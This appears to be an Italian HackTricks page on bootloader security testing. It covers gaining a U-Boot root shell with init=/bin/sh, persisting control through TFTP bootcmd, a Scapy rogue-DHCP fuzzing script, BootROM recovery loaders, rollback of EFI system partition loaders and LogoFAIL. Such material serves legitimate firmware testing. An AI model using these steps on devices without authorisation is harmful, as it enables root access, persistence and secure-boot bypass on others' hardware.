# Test dei bootloader

{{#include ../../banners/hacktricks-training.md}}

I seguenti passaggi sono consigliati per modificare le configurazioni di avvio del dispositivo e testare bootloader come U-Boot e loader di classe UEFI. Concentrati sull'ottenere esecuzione di codice nelle fasi iniziali, valutare le protezioni di firma/rollback e abusare dei percorsi di recovery o di network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: vittorie rapide e abuso delle variabili d'ambiente

1. Accedere all'interpreter shell
- Durante il boot, premi un tasto di interruzione noto (spesso qualsiasi tasto, 0, space, o una sequenza "magica" specifica della board) prima che `bootcmd` venga eseguito per entrare al prompt di U-Boot.

2. Ispezionare lo stato di boot e le variabili
- Comandi utili:
- `printenv` (dump dell'ambiente)
- `bdinfo` (info sulla board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi di boot kernel supportati)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modificare gli argomenti di boot per ottenere una shell root
- Aggiungi `init=/bin/sh` in modo che il kernel apra una shell invece dell'init normale:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot dal tuo server TFTP
- Configura la rete e scarica un kernel/fit image dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Rendere persistenti le modifiche tramite l'ambiente
- Se lo storage dell'env non è protetto in scrittura, puoi persistere il controllo:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifica variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori mal configurati possono permettere interruzioni ripetute nella shell.

6. Controllare funzionalità di debug/insicure
- Cerca: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, la possibilità di `loady`/`loads` via seriale, `env import` da media non affidabili, e kernel/ramdisk caricati senza controlli di firma.

7. Test delle immagini/verification di U-Boot
- Se la piattaforma dichiara secure/verified boot con immagini FIT, prova immagini sia non firmate che manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso permette di bootare payload arbitrari.

## Superficie di network-boot (DHCP/PXE) e server rogue

8. Fuzzing dei parametri PXE/DHCP
- La gestione BOOTP/DHCP legacy di U-Boot ha avuto problemi di sicurezza della memoria. Per esempio, CVE‑2024‑42040 descrive memory disclosure via risposte DHCP appositamente costruite che possono leak byte dalla memoria di U-Boot sulla rete. Esegui i percorsi del codice DHCP/PXE con valori troppo lunghi o ai limiti (option 67 bootfile-name, vendor options, campi file/servername) e osserva blocchi o leak.
- Snippet minimale in Scapy per stressare i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valida anche se i campi filename di PXE vengono passati alla shell/logic del loader senza sanitizzazione quando concatenati a script di provisioning lato OS.

9. Test di command injection tramite DHCP server rogue
- Allestisci un servizio DHCP/PXE rogue e prova a iniettare caratteri nei campi filename o options per raggiungere interpreti di comandi nelle fasi successive della catena di boot. L'auxiliary DHCP di Metasploit, `dnsmasq`, o script Scapy personalizzati funzionano bene. Isola la rete di laboratorio prima di testare.

## Modalità di recovery BootROM SoC che sovrascrivono il boot normale

Molti SoC espongono una modalità BootROM "loader" che accetta codice via USB/UART anche quando le immagini flash sono invalide. Se i fuse di secure-boot non sono bruciati, questo può fornire esecuzione di codice arbitraria molto presto nella catena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) o `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` per pushare ed eseguire un U-Boot custom da RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per stageare un loader e uploadare un U-Boot custom.

Valuta se il dispositivo ha eFuses/OTP di secure-boot bruciati. Se no, le modalità di download BootROM spesso bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo il tuo payload di primo stadio direttamente da SRAM/DRAM.

## UEFI/bootloader per PC-class: controlli rapidi

10. Tampering dell'ESP e test di rollback
- Monta la EFI System Partition (ESP) e controlla i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi dei vendor logo.
- Prova a bootare con componenti firmati downgraded o noti vulnerabili se le revoche di Secure Boot (dbx) non sono aggiornate. Se la piattaforma ancora si fida di shims/bootmanagers vecchi, spesso puoi caricare il tuo kernel o `grub.cfg` dall'ESP per ottenere persistenza.

11. Bug nel parsing del boot logo (classe LogoFAIL)
- Diversi firmware OEM/IBV erano vulnerabili a difetti di parsing di immagini in DXE che processano i boot logo. Se un attaccante può posizionare un'immagine crafted sull'ESP sotto un percorso vendor-specifico (es., `\EFI\<vendor>\logo\*.bmp`) e rebootare, l'esecuzione di codice nelle fasi iniziali del boot può essere possibile anche con Secure Boot abilitato. Testa se la piattaforma accetta logo forniti dall'utente e se quei percorsi sono scrivibili dall'OS.

## Precauzioni hardware

Fai attenzione quando interagisci con SPI/NAND flash durante il boot iniziale (es., cortocircuitare pin per bypassare letture) e consulta sempre il datasheet del flash. Cortocircuiti temporizzati male possono corrompere il dispositivo o il programmer.

## Note e suggerimenti aggiuntivi

- Prova `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per spostare blob di ambiente tra RAM e storage; alcune piattaforme permettono di importare env da media rimovibili senza autenticazione.
- Per persistenza su sistemi Linux che bootano tramite `extlinux.conf`, modificare la linea `APPEND` (per iniettare `init=/bin/sh` o `rd.break`) sulla partizione di boot spesso è sufficiente quando non sono applicati controlli di firma.
- Se lo userland fornisce `fw_printenv/fw_setenv`, verifica che `/etc/fw_env.config` corrisponda al vero storage dell'env. Offset mal configurati permettono di leggere/scrivere la regione MTD sbagliata.

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
